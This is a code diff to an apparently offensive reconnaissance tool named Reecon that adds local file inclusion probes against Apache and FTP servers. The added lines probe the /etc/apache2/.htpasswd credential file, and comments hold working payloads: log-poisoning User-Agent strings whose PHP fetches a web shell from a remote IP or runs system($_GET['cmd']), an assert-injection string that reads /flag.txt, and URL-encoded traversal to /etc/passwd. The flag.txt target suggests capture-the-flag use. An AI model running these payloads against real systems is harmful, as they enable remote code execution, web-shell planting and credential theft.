@@ -63,15 +63,26 @@ namespace Reecon
                 bool hasApache = DoLFI(linux_apache);
                 if (hasApache)
                 {
+                    // Check for .htpasswd
+                    DoLFI(new List<string>() { "/etc/apache2/.htpasswd" });
+
                     // Apache2 Log Poisoning Path (Very restricted): 
                     bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
                     if (apache2Log)
                     {
                         // Log poisoning file upload
                         // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
+                        // Mozilla/5.0 <?php system($_GET['cmd']);?> Firefox/70.0 if no callbacks allowed / you can't find the file
                         Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                     }
                 }
+
+                // Do some logging checks
+                List<string> linux_logs = new List<string>()
+                {
+                    "/var/log/vsftpd.log"
+                };
+                DoLFI(linux_logs);
 
                 // Do MySQL Checks
                 List<string> linux_mysql = new List<string>
@@ -180,9 +191,13 @@ namespace Reecon
         {
             // TODO: Null Byte each
             // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
+            // TODO: Asset Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
 
             // If it must contain a word
             // php://filter/read=convert.base64-encode/wordhere/resource=flag
+
+            // ../ bypass: %2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd - Default?
+            // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
             bool hasResult = false;
             foreach (string check in lfiChecks)
